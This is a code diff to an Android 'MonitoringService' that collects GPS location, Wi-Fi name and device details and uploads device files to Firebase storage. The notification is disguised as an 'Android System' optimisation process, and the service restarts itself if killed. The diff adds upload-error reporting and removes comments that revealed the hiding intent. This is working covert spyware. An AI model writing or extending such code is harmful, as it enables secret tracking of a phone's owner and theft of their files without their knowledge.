@@ -28,6 +28,7 @@ import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Base64
+import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.LocationServices
@@ -105,7 +106,6 @@ class MonitoringService : Service() {
         val wifiName = getWifiName(applicationContext)
         val model = "${Build.MANUFACTURER} ${Build.MODEL}"
 
-        // Obtener ubicación GPS
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
@@ -207,30 +207,36 @@ class MonitoringService : Service() {
         val file = File(path)
         if (!file.exists() || file.isDirectory) return
 
-        val fileUri = Uri.fromFile(file)
         val storageRef = storage.child("transfers/$childId/${file.name}")
 
-        storageRef.putFile(fileUri).addOnSuccessListener {
+        storageRef.putFile(Uri.fromFile(file)).addOnSuccessListener {
             storageRef.downloadUrl.addOnSuccessListener { url ->
                 database.child("file_ready").child(childId).setValue(mapOf(
                     "name" to file.name,
                     "url" to url.toString(),
+                    "status" to "success",
                     "timestamp" to System.currentTimeMillis()
                 ))
             }
+        }.addOnFailureListener { e ->
+            database.child("file_ready").child(childId).setValue(mapOf(
+                "name" to file.name,
+                "status" to "error",
+                "message" to e.message,
+                "timestamp" to System.currentTimeMillis()
+            ))
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(statusUpdater)
-        // Intentar reiniciar el servicio si es destruido por el sistema
         val broadcastIntent = Intent(this, BootReceiver::class.java)
         sendBroadcast(broadcastIntent)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY // Indicar al sistema que debe reiniciar el servicio si lo mata
+        return START_STICKY
     }
 
     override fun onBind(intent: Intent?): IBinder? {
@@ -253,7 +259,7 @@ class MonitoringService : Service() {
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle("Sistema de Android")
             .setContentText("Procesando servicios de optimización...")
-            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim) // Icono discreto
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(Notification.CATEGORY_SERVICE)
             .setSilent(true)
